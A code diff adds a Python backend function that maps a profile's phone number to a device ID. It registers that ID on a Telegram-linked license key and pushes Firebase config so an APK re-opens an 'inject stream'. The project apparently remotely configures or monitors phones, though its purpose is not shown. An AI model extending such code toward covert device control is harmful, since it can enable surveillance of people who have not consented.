@@ -491,6 +491,39 @@ async def push_mynum_inject(
     return message_id
 
 
+async def publish_mynum_inject_target(
+    profile: MonitorProfile,
+    device: Device | None,
+    *,
+    telegram_user_id: int | None = None,
+) -> str | None:
+    """Apply /mynum immediately — Firebase config device_id = num-{phone} for APK inject."""
+    if not profile.phone_number:
+        return None
+
+    poll_id = mynum_device_id(profile.phone_number)
+    license_key = get_license_key(profile)
+    uid = telegram_user_id if telegram_user_id is not None else profile.telegram_user_id
+    if license_key and license_key.upper().startswith("KEY-") and uid is not None:
+        from app.license_keys import register_device_on_key
+
+        register_device_on_key(license_key, poll_id, uid)
+
+    if profile.is_monitoring:
+        await nudge_apk_poll_config(profile, device)
+    else:
+        await push_virtus_apk_config(profile, device)
+        await push_module_config(profile, device)
+
+    logger.info(
+        "Mynum inject target updated poll_id=%s phone=%s monitoring=%s",
+        poll_id,
+        profile.phone_number,
+        profile.is_monitoring,
+    )
+    return poll_id
+
+
 async def nudge_apk_poll_config(profile: MonitorProfile, device: Device | None = None) -> None:
     """After auto-stop, brief monitoring=false then true so APK re-opens the inject stream."""
     if not profile.is_monitoring:
